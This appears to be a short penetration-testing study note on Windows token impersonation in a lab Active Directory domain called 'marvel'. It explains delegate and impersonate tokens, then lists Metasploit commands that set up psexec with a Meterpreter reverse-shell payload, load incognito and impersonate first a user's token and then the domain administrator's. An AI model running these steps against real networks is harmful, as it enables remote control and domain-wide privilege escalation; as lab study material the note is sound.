# Token Impersonation

Tokens are temporary keys that allow access to a system/network without having to provide credentials each time you access a file. (Like cookies for computers). There are two types:

- Delegate - Created for logging into a machine or using RDP
- Impersonate - "Non-interactive" Such has attaching a network drive or a domain logon script.

This can be especially lethal if domain admins are logging into normal machines.

```bash
msfconsole

search psexec

use 4

set payload windows/x64/meterpreter/reverse_tcp

load incognito

help

list_tokens -u #-g

impersonate_token marvel\\fcastle

rev2self
```

Before the Administrator user logs in
![[token1.png]]

After a user logs in as Administrator
![[token2.png]]


```
impersonate_token MARVEL\\administrator
```